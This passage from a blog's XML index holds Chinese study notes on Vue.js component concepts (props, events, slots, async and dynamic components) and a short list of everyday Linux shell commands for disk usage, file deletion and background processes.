class="line">//过滤首尾空格</span><br><span class="line">    <span class="selector-tag">input</span><span class="selector-attr">[type=<span class="string">&quot;text&quot;</span>]</span><span class="selector-attr">[v-model.trim=<span class="string">&quot;message&quot;</span>]</span></span><br><span class="line">    <span class="selector-tag">p</span>&#123;&#123;&#123;message&#125;&#125;&#125;</span><br><span class="line">    </span><br><span class="line">    data:&#123;message:<span class="string">&#x27;&#x27;</span>&#125;</span><br></pre></td></tr></table></figure></li></ul>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> 《Vue.js 实战》笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> Vue </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>7-组件详解</title>
      <link href="/categories/%E5%89%8D%E7%AB%AF/%E3%80%8AVue-js-%E5%AE%9E%E6%88%98%E3%80%8B%E7%AC%94%E8%AE%B0/7-%E7%BB%84%E4%BB%B6%E8%AF%A6%E8%A7%A3/"/>
      <url>/categories/%E5%89%8D%E7%AB%AF/%E3%80%8AVue-js-%E5%AE%9E%E6%88%98%E3%80%8B%E7%AC%94%E8%AE%B0/7-%E7%BB%84%E4%BB%B6%E8%AF%A6%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<h4 id="7-1-组件与复用"><a href="#7-1-组件与复用" class="headerlink" title="7.1 组件与复用"></a>7.1 组件与复用</h4><ul><li>注册<ul><li>全局注册<figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Vue.component(&#x27;<span class="keyword">my</span>-component-<span class="built_in">name</span>&#x27;,&#123;</span><br><span class="line">    template:&#x27;&lt;<span class="keyword">div</span>&gt;模板&lt;/<span class="keyword">div</span>&gt;&#x27;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></li><li>局部注册<figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">var Chile</span>=&#123;</span><br><span class="line">    template:<span class="string">&#x27;&lt;div&gt;模板&lt;/div&gt;&#x27;</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="attribute">var app</span>=new Vue(&#123;</span><br><span class="line">   el:<span class="string">&#x27;#app&#x27;</span>,</span><br><span class="line">   components:&#123;</span><br><span class="line">       <span class="string">&#x27;my-component&#x27;</span>:Child</span><br><span class="line">   &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></li></ul></li><li>组件可以使用的选项<span id="more"></span><ul><li><code>template</code></li><li><code>data</code><ul><li>区别：必须是函数，然后把数据return<figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="title">        data:</span>function()&#123;</span><br><span class="line">            <span class="keyword">return</span>&#123;</span><br><span class="line"><span class="title">                message1:</span>&#x27;组件内容&#x27;,</span><br><span class="line"><span class="title">                message2:</span>&#x27;另一个组件内容&#x27;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    - 注意：如果`return`的对象引用了外部对象，那么数据会共享,所以为了复用组件，需要给组件返回一个新的`data`独立</span><br><span class="line"></span><br><span class="line">  - `computed`</span><br><span class="line">  - `methods`</span><br><span class="line">  - `&lt;table&gt;`内需要使用特殊的`is`属性挂在组件</span><br><span class="line">  </span><br><span class="line">#### <span class="number">7.2</span> 使用`props`传递数据</span><br><span class="line">##### 组件间通信：</span><br><span class="line">- 正向传递数据：父组件向子组件传递数据或参数</span><br><span class="line">  - 接受父级的数据(字符串)</span><br></pre></td></tr></table></figure>//props 为了 复用+个性化 组件？<br>//需要驼峰命名的props名称转为短横分隔命名 （warningText-&gt;warning-text）<br>//my-component 接受来自父级的数据(warning-text)，并把他在组件模板中渲染(template)<br>  div#app<pre><code>  my-component[warning-text=&quot;提示信息&quot;]  my-component[warning-text=&quot;警告信息&quot;]</code></pre>  Vue.component-&gt;’my-component’<pre><code>  props:[&#39;warningText&#39;],  template:&#39;&lt;div&gt;&#123;&#123;warningText&#125;&#125;&lt;/div&gt;&#39;</code></pre><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">- 动态绑定`props`的值,使用来自父级的动态数据(单向)</span><br></pre></td></tr></table></figure>// 数据来源 input-text: parentMessage –&gt; 父组件绑定属性 bind:message-one: parentMessage –&gt; 渲染 props:messageOne   div<br>div#app<br>  input[type=text][v-model=parentMessage]<br>  my-component[:message-one=parentMessage]</li></ul>Vue.component -&gt; ‘my-component’<pre><code>props:[&#39;messageOne&#39;],template:&#39;&lt;div&gt;&#123;&#123;messageOne&#125;&#125;&lt;/div&gt;&#39;</code></pre>app -&gt; new Vue<pre><code>el:&#39;#app&#39;,data:&#123;    parentMessage:&#39;&#39;&#125;</code></pre><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">  - 传输 非字符串类型数据(数组、对象、数字)时需要 bind</span><br><span class="line">  </span><br><span class="line">##### 单向数据流</span><br><span class="line">  父组件数据变化时会传递给子组件，但是反过来不行，避免子组件无意中修改父组件的状态&lt;/br&gt;</span><br><span class="line">###### 两种需要改变`prop`的情况</span><br><span class="line">  - 接收父组件传来的初始值</span><br><span class="line">    </span><br></pre></td></tr></table></figure>  //此例中 initCount 是父组件传来初始值的，之后只要维护 count就可以了<pre><code>div#app    my-component[:init-count=&quot;1&quot;]    Vue.component-&gt; &#39;my-component&#39;    props:[&#39;initCount&#39;],    template:&#39;&lt;div&gt;&#123;&#123;count&#125;&#125;&lt;/div&gt;&#39;,    data:function()&#123;        return &#123;            count:this.initCount        &#125;    &#125;var app -&gt; new Vue    el:&#39;#app&#39;</code></pre>  <figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="code">    </span></span><br><span class="line"><span class="bullet">- </span>作为需要被转变的原始值传入（这种情况用计算属性）</span><br></pre></td></tr></table></figure><pre><code>//此例中是 width: 200 -&gt; 200px     div#app        my-component[:width=&quot;200&quot;]        Vue.component -&gt; my-component        props:[&#39;width&#39;]        template:&#39;&lt;div :style=&quot;style&quot;&gt;组件内容&lt;div&gt;&#39;        computed:&#123;            style:function()&#123;                return &#123;                    width:this.width+&#39;px&#39;                &#125;            &#125;        &#125;</code></pre><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">    </span><br><span class="line">  - `props`是对象或数组时，在子组件内改变会影响父组件。（因为是引用类型）</span><br><span class="line"></span><br><span class="line">##### <span class="number">7.2</span><span class="number">.3</span> 数据验证</span><br><span class="line">一般组件提供给别人使用时，需要进行数据验证(prop)</span><br><span class="line">- prop数据类型验证示例</span><br><span class="line">  - 数字类型</span><br></pre></td></tr></table></figure>Vue.component -&gt; my-component<br>props:{<pre><code>//必须是数字类型propA:Number,//必须是字符串或数字类型propB:[String,Number],//布尔值，如果没有定义，默认值就是truepropC:&#123;    type:Boolean,    default:true&#125;,//数字，而且是必传propD:&#123;    type:Number,    required:true&#125;,//如果是数组或对象，默认值必须是一个函数来返回propE:&#123;    type:Array,    default:function()&#123;        return [];    &#125;&#125;,//自定义一个验证函数propF:&#123;   validator:function(value)&#123;   return value&gt;10;&#125;</code></pre>}<br>//type: String Number  Boolean  Object Array  Function<br>//type 也可以是一个自定义构造器，使用 instanceof 检测<br>//prop 验证失败，开发版本下会在控制台抛出一个警告<figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">####  <span class="number">7.3</span> 组件通信</span><br><span class="line">&lt;img src=<span class="string">&quot;//ww1.sinaimg.cn/large/005zbIM7ly1g59k6zg147j30l30btgs6.jpg&quot;</span> alt=<span class="string">&quot;img&quot;</span>&gt;</span><br><span class="line"></span><br><span class="line">##### <span class="number">7.3</span><span class="number">.1</span> 自定义事件</span><br><span class="line">&amp;emsp;&amp;emsp;当子组件需要向父组件传递数据时，就要用到自定义事件。</span><br><span class="line">&lt;br&gt;&amp;emsp;&amp;emsp;子组件用`$emit()`触发事件，父组件用`$on()`来监听子组件的事件。  </span><br><span class="line">？？父组件也可以直接在子组件的自定义标签上使用 `v-on`监听子组件触发的自定义事件。</span><br></pre></td></tr></table></figure>//子组件的： counter  &amp;&amp;  handleIncrease &amp;&amp;  handleReduce<br>//通过$emit传递给父组件： this.$emit(‘crease’,this.counter) &amp;&amp; this.$emit(‘reduce’,this.counter)<br>//父组件：my-component[@crease=”handleGetTotal”][@reduce=”handleGetTotal”]<br>div#app<br>p{总数：}<br>my-component[@increase=”handleGetTotal”][@reduce=”handleGetTotal”]</li></ul></li></ul><p>Vue.component(‘my-component’,{<br>    template:’<br>    <div><br>        &lt;button @click=”handleIncrease”&gt;+1</button><br>        &lt;button @click=”handleReduce”&gt;-1</button><br>    </div>‘,<br>    data:function(){<br>        return {<br>            counter:0<br>        }<br>    },<br>    methods:{<br>        handleIncrease:function(){<br>            this.counter++;<br>            this.$emit(‘increase’,this.counter);<br>        },<br>        handleReduce:function(){<br>            this.counter–;<br>            this.$emit(‘reduce’,this.counter);<br>        }<br>    }<br>});</p><p>var app -&gt;  new Vue()<br>    el:’#app’,<br>    data:{<br>        total:0<br>    },<br>    methods:{<br>        handleGetTotal:function(total){<br>            this.total=total;<br>        }<br>    }</p><p>//使用 .native 修饰符监听DOM事件<br>// <my-component v-on:click.native="handleClick"></my-component></p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">##### <span class="number">7.3</span><span class="number">.2</span> 自定义组件使用`v-model`</span><br><span class="line"></span><br><span class="line">- 直接使用 `v-model` 绑定数据</span><br></pre></td></tr></table></figure><p>//父组件   v-model=total<br>//app -&gt;  data:total<br>//子组件： this.$emit(‘input’,this.counter);<br>div#app<br>    my-component[v-model=total]</p><p>my-component<br>    template: button[@click=handleIncrease]<br>    data: -&gt; -&gt; -&gt; counter:0<br>    methods:<br>        handleIncrease:function(){<br>            this.counter++;<br>            this.$emit(‘input’,this.counter);<br>        }<br>//相当于 父组件：@input=handleIncrease<br>//             methods: handleIncrease(){…}</p><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">- 创建自定义表单输入组件，进行数据双向绑定</span><br><span class="line">  - 需要：接收一个`value`属性</span><br><span class="line">  - 需要：在有新的`value`时触发`input`事件</span><br></pre></td></tr></table></figure><p>  //实现父组件改变值: total–<br>  //子组件同步改变：counter–?<br>    div#app<br>        p{总数：}<br>        my-component[v-model=total]<br>        button[@handleReduce]{-1}</p><pre><code>mycomponent    template:&#39;&lt;input :value @input=&quot;updateValue&quot;&gt;&#39;    methods:&#123;        //实际上这个根本没有运行？没有也行？        updateValue:function(event)&#123;            console.log(this.value);            console.log(event.target.value);            this.$emit(&#39;input&#39;,event.target.value);        &#125;    &#125;app  -&gt; new Vue    data:         total    methods:        handleReduce</code></pre>  <figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">  </span><br><span class="line">##### <span class="number">7.3</span><span class="number">.3</span> 非父子组件通信</span><br><span class="line"></span><br><span class="line">- 使用一个空的Vue实例作为中央时间总线(bus).</span><br></pre></td></tr></table></figure><p>div#app<br>    <br>    <component-a></component-a><br>script<br>    var bus = new Vue();</p><pre><code>component-a    template:&#39;&lt;button @click=&quot;handleEvent&quot;&gt;&lt;/button&gt;&#39;,    methods:        handle:function()&#123;            bus.$emit(&#39;on-message&#39;,&#39;来自子组件的内容&#39;)        &#125;var app = new Vue    data:  message ,    mounted:funciton()&#123;        _this=this;        bus.$on(&#39;on-message&#39;,function(msg)&#123;            _this.message=msg;        &#125;)    &#125;</code></pre><p>//创建一个名为bus的空Vue实例<br>//全局定义组件 component-a<br>    //点击按钮 会触发事件 onmessage<br>//创建Vue实例 app<br>    //mounted钩子函数里监听 bus 的事件 on-message<br>//点击按钮，会通过bus把时间 on-message 发出去<br>//此时app就会接受到来自bus的事件,进而在回调里完成自己的业务逻辑</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="bullet">-</span> <span class="strong">**父链**</span></span><br><span class="line">&amp;emsp;(子组件使用 <span class="code">`this.$parent`</span>可以直接访问该组件的父实例或组件，父组件可以使用<span class="code">`this.$children`</span>访问它所有的子组件。并且可以无限的向上或向下访问。)</span><br><span class="line"></span><br><span class="line"><span class="bullet">  -</span> <span class="code">`this.$parent`</span></span><br></pre></td></tr></table></figure><pre><code>div#app    &#123;&#123;message&#125;&#125;    component-bcomponent-b    template:&#39;button[@click=handleEvent]&#39;    methods        handleEvent:function()&#123;            this.$parent.message=&quot;更改父实例的message&quot;        &#125;app = new Vue    el:&#39;#app&#39;,    data:&#123;        message:&#39;&#39;    &#125;</code></pre>  <figure class="highlight haml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">-<span class="ruby"> <span class="string">`this.$children`</span></span></span><br><span class="line"><span class="ruby"></span>  -<span class="ruby"> (使用特殊的属性<span class="string">`ref`</span>为子组件指定一个索引名称)</span></span><br><span class="line"><span class="ruby"></span>  -<span class="ruby"> this.<span class="variable">$refs</span>只在组件渲染完成后才填充，并且是非响应式的</span></span><br><span class="line"><span class="ruby"></span>  -<span class="ruby"> 应该避免在模板或计算属性中使用 <span class="string">`$refs`</span></span></span><br></pre></td></tr></table></figure><pre><code>div#app    &#123;&#123;message&#125;&#125;    button[@click=&quot;handleRef&quot;]    component-a[refs=&#39;comA&#39;]script    component-a        data            msg:&#39;子组件内容&#39;    app        el:&#39;app&#39;,        data:            message:&#39;&#39;        methods:            handleRef:function()&#123;                this.message=this.$refs.comA.msg;            &#125;<figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">  </span><br><span class="line">#### <span class="number">7.4</span> 使用`slot`分发内容</span><br><span class="line">当需要让组件组合使用，混合父组件的内容与子组件的模板时，就会用到 slot， 这个过程叫作内容分发（ transclusion）。&lt;br&gt;</span><br><span class="line">给`&lt;slot&gt;`元素指定一个`name`后可以分发多个内容，具名`Slot`可以和单个`Slot`共存。&lt;br&gt;</span><br><span class="line">如果`slot`没有使用`name`属性，那么将作为默认`slot`出现。如果没有指定匿名的`slot`，父组件内多余的内容片段都将被抛弃。&lt;br&gt;</span><br><span class="line">子组件里的`slot`标签可以设置备用内容。</span><br></pre></td></tr></table></figure></code></pre><p>div#app<br>    my-component<br>        h3[slot=”header”]<br>        p{匿名的slot}</p><p>script<br>    Vue.component  ‘my-component’<br>        p{一些其他内容}<br>        slot[name=”header”]<br>        slot<br>        slot[name=”footer”]{我有备用}</p><pre><code>app=new Vue   </code></pre><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">##### <span class="number">7.4</span><span class="number">.4</span> 作用域插槽</span><br><span class="line">&amp;emsp;&amp;emsp;特殊的`slot`,使用一个可以复用的模板替换已渲染元素。</span><br></pre></td></tr></table></figure><p>div#app<br>    component-a<br>        {父组件的内容}<br>        template[scope=”props”]<br>            <br>script<br>    Vue.component  ‘component-a’<br>        slot[msg=”来自子组件的内容”]</p><p>//子组件内，slot 元素使用 msg=”xxx”,将数据传到插槽上<br>//父组件使用 <template> 元素 的 scope=”props” ,通过临时变量 props 访问来自子组件插槽的数据 msg。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">&amp;emsp;</span><span class="symbol">&amp;emsp;</span>另一个例子</span><br></pre></td></tr></table></figure><p>div#app<br>    my-list[:books=books]<br>        template[slot=”book”][scope=”props”]<br>            li</p><p>script<br>    Vue.component  ‘my-list’<br>        props:{<br>            books:{<br>                type:Array,<br>                default:function{<br>                    return [];<br>                }<br>            }<br>        },<br>        template:<code>            &lt;ul&gt;                 &lt;slot v-for=&quot;book in books&quot; :book-name=&quot;book.name&quot; name=&quot;book&quot;&gt;&lt;/slot&gt;             &lt;/ul&gt;        </code></p><pre><code>app    el:&#39;app&#39;,    data:&#123;        books:[            &#123;name:&#39;第一本书&#39;&#125;,            &#123;name:&#39;第2本书&#39;&#125;,            &#123;name:&#39;third book&#39;&#125;        ]    &#125;</code></pre><p>// 数据由子组件提供，样式有父组件设置</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">##### <span class="number">7.4</span><span class="number">.5</span> 访问`slot`</span><br><span class="line">&amp;emsp;&amp;emsp;使用`$slots`方法访问slot分发的内容。主要用于独立组件的开发。</span><br></pre></td></tr></table></figure><p>div#app<br>    h3[slot=header]{标题}<br>    p{默认内容}<br>Vue.component  ‘my-component’<br>    template<br>        slot[name=header]</p><pre><code>mounted:function()&#123;    var header=this.$slots.header;    var main=this.$slots.default;    console.log(header);    console.log(main[0].elm.innerHTML);&#125;</code></pre><p>app  el:’#app’</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">#### <span class="number">7.5</span> 组件高级用法</span><br><span class="line">##### <span class="number">7.5</span><span class="number">.1</span> 递归组件</span><br><span class="line">&amp;emsp;&amp;emsp;组件在它的模板内可以递归地调用自己，只要给组件设置`name`选项。&lt;br&gt;</span><br><span class="line">&amp;emsp;&amp;emsp;可以用来开发一些位未知层级关系的独立组件，比如级连选择器和树形选择器。</span><br></pre></td></tr></table></figure><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">##### <span class="number">7.5</span><span class="number">.2</span> 内联模板</span><br><span class="line">&amp;emsp;&amp;emsp;给组件标签使用`<span class="keyword">inline</span>-template`特性，组件就会把它的内容当成模板。</span><br></pre></td></tr></table></figure><p>div#app<br>    child-component[inline-template]<br>        h3{在父组件中定义子组件的模板}<br>        <br>        </p><p>script<br>    Vue.component(‘child-component’,{  })<br>        data:funciton(){<br>            return {<br>                msg:’子组件声明的数据’<br>            }<br>        }</p><pre><code>app    el:&#39;#app&#39;,    data:&#123;        message:&#39;父组件声明的数据&#39;    &#125;</code></pre><p>//使用 vue.js(开发模式), 模板内的父组件数据不能渲染<br>//同名时，优先使用子组件的数据</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">##### <span class="number">7.5</span><span class="number">.3</span> 动态组件</span><br></pre></td></tr></table></figure><p>div#app<br>    component[:is=”currentView”)]<br>        button[@click=”handleCurrentView(‘A’)”]{切换到A}<br>        button[@click=”handleCurrentView(‘B’)”]{切换到B}<br>        button[@click=”handleCurrentView(‘C’)”]{切换到C}<br>script<br>    app = new Vue()<br>        data:<br>            currentView:’comA’<br>        components:{<br>            ‘comA’:{<br>                template:’<div>组件A</div>‘<br>            },<br>            ‘comB’:{<br>                template:’<div>组件B</div>‘<br>            },<br>            ‘comC’:{<br>                template:’<div>组件C</div>‘<br>            }<br>        },<br>        methods:{<br>            handleCurrentView(component_):function(){<br>                this.currentView=’com’+component_;<br>            }<br>        }</p><p>//多个模板在 componets 里<br>//根据值 currentView 来切换模板<br>//需要一个用户能够改变 currentView 值的按钮。</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">##### <span class="number">7.5</span><span class="number">.4</span> 异步组件</span><br><span class="line">&amp;emsp;&amp;emsp;如果组件过多时，一开始就把所有组件都加载是没必要的开销。所以，Vue.js 允许将组件定义为一个工厂函数，动态地解析组件。Vue.js 只在组件需要**渲染**时触发**工厂函数**，并且把结果储存起来，用于后面的再次渲染。</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>Vue.component(‘my-component’,function(resolve,reject){<br>        window.setTimeout(function(){<br>            resolve({<br>               template:’<div>我是异步渲染的</div>‘<br>            });<br>        },1000);<br>    }</p><p>//1秒后 渲染子组件</p><p>// JavaScript - 异步<br>// funciton test(resolve,reject){…}<br>// function todo(result){<br>//     return (new Promise(function(resolve,reject){…})<br>// }<br>// var p1 = new Promise(test)<br>//       .then(todo)<br>//       .then(function(result){…})<br>//       .catch(function(reason){…});</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">#### <span class="number">7.6</span> 其他</span><br><span class="line">##### <span class="number">7.6</span><span class="number">.1</span> $nextTick</span><br><span class="line">Vue观察到数据变化时，不是直接更新DOM,而是开启一个队列，并缓冲在同一时间循环中发生的所有数据变化。在缓冲时会去除重复数据，从而避免不必要的计算和DOM操作。</span><br><span class="line">&lt;br&gt;然后，在下一个事件循环tick中，Vue刷新队列并执行实际(已去重)工作。</span><br></pre></td></tr></table></figure><p>div#app<br>    div#div[v-if=showDiv]{这是一段文本}<br>    button[@click=”getText”]{获取div内容}<br>script<br>    var appp = new Vue<br>        el:’app’<br>        data:<br>            showDiv:false<br>        method:<br>            getText:function(){<br>                _this=this;<br>                this.showDiv=true;<br>                var text=document.getElementById(‘div’).innerHTML;<br>                console.log(text);<br>            }</p><p>//因为还没更新DOM<br>//所以会出现错误：TypeError: “document.getElementById(…) is null”<br>//$nextTick 等下一个时间循环tick<br>//   this.$nextTick(function(){ …getElementById…log…  })</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">##### <span class="number">7.6</span><span class="number">.2</span> X-Templates</span><br><span class="line">另一种定义模板的方式</span><br></pre></td></tr></table></figure><p>div#app<br>    my-component<br>    script[type=”text/x-template”][id=”my-component-“]<br>        div{这是组件的内容}<br>script<br>    Vue.component(‘my-component’,{<br>        template:’#my-component-‘<br>    })<br>//为了将模板和组件的其他定义隔离</p><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">##### <span class="number">7.6</span>.<span class="number">3</span> 手动挂载实例</span><br><span class="line">一般通过 `new Vue()`的形式创建实例。&lt;br&gt;</span><br><span class="line">如果需要动态地创建Vue实例，可以使用`Vue.extend`和`$mount`两个方法手动挂载一个实例。</span><br></pre></td></tr></table></figure><p>div#mount-div</p><p>script<br>    //创建<br>    var MyComponent = Vue.extend({<br>        template:’<div>Hello:</div>‘,<br>        data:function(){<br>            return {<br>                name:’Aresn’<br>            }<br>        }<br>    })<br>    //挂载<br>    new MyComponent().$mount(‘#mount-div’);<br>=&gt;  new MyComponent({el:’#mount-div’});<br>=&gt;var component = new MyComponent().$mount();<br>  document.getElementById(‘mount-div’).appendChild(component.$el);</p><pre><code>#### 7.7 两个常用组件的开发</code></pre>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> 《Vue.js 实战》笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> Vue </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>linux 常用命令</title>
      <link href="/categories/Linux/%E5%9F%BA%E7%A1%80%E6%95%99%E7%A8%8B%E7%AC%94%E8%AE%B0/linux-%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"/>
      <url>/categories/Linux/%E5%9F%BA%E7%A1%80%E6%95%99%E7%A8%8B%E7%AC%94%E8%AE%B0/linux-%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/</url>
      
        <content type="html"><![CDATA[<h4 id="查看文件夹大小"><a href="#查看文件夹大小" class="headerlink" title="查看文件夹大小"></a>查看文件夹大小</h4><p> <code>du -h --max-depth=1</code>    <code>?[folder]</code> 默认是 <code>.</code></p><h4 id="rm-反选"><a href="#rm-反选" class="headerlink" title="rm 反选"></a>rm 反选</h4><p>打开<br><code>shopt -s extglob</code></p><p>删除<br><code>rm !(filename1|filename2)</code></p><p>关闭<br><code>shopt -u extglob</code></p><span id="more"></span><h4 id="创建有配额的文件夹-未测试"><a href="#创建有配额的文件夹-未测试" class="headerlink" title="创建有配额的文件夹-未测试"></a>创建有配额的文件夹-未测试</h4><p><a href="https://blog.csdn.net/qaz1qaz1qaz2/article/details/52825408">网址</a></p><h4 id="进程管理"><a href="#进程管理" class="headerlink" title="进程管理"></a>进程管理</h4><ul><li><p><code>shell</code>文件</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/sh     #!/usr/bin/bash</span><br><span class="line">monitorID=<span class="constructor">$(<span class="params">ps</span>- -<span class="params">ef</span>|<span class="params">grep</span> <span class="params">monitor</span>|<span class="params">grep</span> -<span class="params">v</span> &#x27;<span class="params">sh</span>&#x27;|<span class="params">grep</span> -<span class="params">v</span> &#x27;<span class="params">log</span>&#x27;|<span class="params">grep</span> -<span class="params">v</span> &#x27;<span class="params">grep</span>&#x27;|<span class="params">awk</span> &#x27;&#123;<span class="params">print</span> $2&#125;&#x27;)</span></span><br><span class="line">#查询后返回进程ID，</span><br><span class="line">count=<span class="constructor">$(<span class="params">ps</span> -<span class="params">ef</span>|<span class="params">grep</span> <span class="params">monitor</span>|<span class="params">grep</span> -<span class="params">v</span> &#x27;<span class="params">sh</span>&#x27;|<span class="params">grep</span> -<span class="params">v</span> &#x27;<span class="params">grep</span>&#x27;)</span><span class="pattern-match">|wc -l</span></span><br><span class="line"><span class="pattern-match">#返回相关进程个数</span></span><br></pre></td></tr></table></figure></li><li><p>命令行</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#批量杀进程</span><br><span class="line"><span class="keyword">ps</span> -ef|<span class="keyword">grep</span> someProcessId|<span class="keyword">grep</span> -v <span class="string">&#x27;grep&#x27;</span>|awk <span class="string">&#x27;&#123;print &quot;kill -9&quot; $2&#125;&#x27;</span>|<span class="keyword">sh</span></span><br></pre></td></tr></table></figure></li></ul><h4 id="后台运行脚本"><a href="#后台运行脚本" class="headerlink" title="后台运行脚本"></a>后台运行脚本</h4><ol><li><code>sh ./test.sh </code></li><li><code>ctrl+z</code> 切换到后台并暂停</li><li><code>bg number</code>在后台运行( number 是使用 <code>jobs</code>命令查到的 [] 中的数字)</li></ol><p>或者</p><ol><li><code>sh ./test.sh &amp;</code></li></ol><p><strong><code>test.sh</code> 会在 shell 终端关闭时退出。</strong><br><strong>应对：</strong><code> nohup sh ./test.sh &amp;</code><br>退出终端后<code>jobs</code>看不到，只能 <code>ps ef</code> 查看并 <code>kill</code>(打印信息输出到<code>nohup.out</code>)</p><!--more--><h4 id="中断后台运行"><a href="#中断后台运行" class="headerlink" title="中断后台运行"></a>中断后台运行</h4><ol><li><code>jobs</code> 查看已启动任务情况</li><li><code>fg %number</code> ，<code>ctrl+c</code> 切换到前台运行,在停止</li></ol><p>或者<br>2. <code>kill %number</code></p>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
          <category> 基础教程笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
            <tag> shell </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>5.内置指令</title>
